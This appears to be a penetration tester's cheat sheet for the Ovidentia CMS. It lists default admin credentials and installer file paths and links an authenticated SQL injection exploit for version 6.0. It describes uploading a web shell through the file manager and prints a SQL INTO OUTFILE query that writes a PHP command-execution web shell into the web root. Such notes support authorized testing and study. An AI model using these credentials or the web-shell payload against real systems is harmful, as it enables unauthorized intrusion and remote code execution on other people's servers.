# ovidentia

## Default Creds

```bash
# http://chantal.jeannin.free.fr/install/install.txt
admin@admin.bab:012345678
```

## Interesting Path

```bash
/install/install.txt
/install/babinstall.mysql
```

## SQL injection

v 6.0 Authenticated

```
https://www.exploit-db.com/exploits/49707
```

### File Manager Upload (Authenticated)

once logged in, File Manager (on left) > Add Folder > Upload shell

## Shell directly via SQL

```
select "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/wamp/www/php/web.php'
```
